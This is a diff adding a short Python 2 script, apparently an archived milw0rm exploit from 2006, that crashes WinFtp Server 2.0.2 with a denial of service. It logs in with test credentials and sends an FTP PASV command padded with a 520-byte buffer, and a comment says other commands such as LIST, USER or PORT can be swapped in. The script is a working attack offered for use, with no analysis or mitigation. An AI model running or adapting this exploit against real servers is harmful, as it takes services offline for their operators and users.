@@ -1,0 +1,34 @@
+import sys,os,string
+import socket
+import struct
+import time
+
+print "-----------------------------------------------------------------------"
+print "# WinFtp Server Version 2.0.2 Denial of Service"
+print "# url: http://www.wftpserver.com/"
+print "# author: shinnai"
+print "# mail: shinnai[at]autistici[dot[org]"
+print "# site: http://shinnai.altervista.org"
+print "# soundtrack: Territorial pissing (by Nirvana)"
+print "# you can choose one of all ftp commands implemented :)"
+print "-----------------------------------------------------------------------"
+
+
+
+buffer = "A" * 520
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+   conn = s.connect(("127.0.0.1",21))
+except:
+   print "- Unable to connect. exiting."
+
+d = s.recv(1024)
+time.sleep(2)
+s.send('USER %s\r\n' % "test")
+time.sleep(2)
+s.send('PASS %s\r\n' % "test")
+time.sleep(2)
+s.send('PASV %s\r\n' % buffer) #You can change PASV with LIST, USER, PORT, etc...
+time.sleep(2)
+
+# milw0rm.com [2006-12-19]
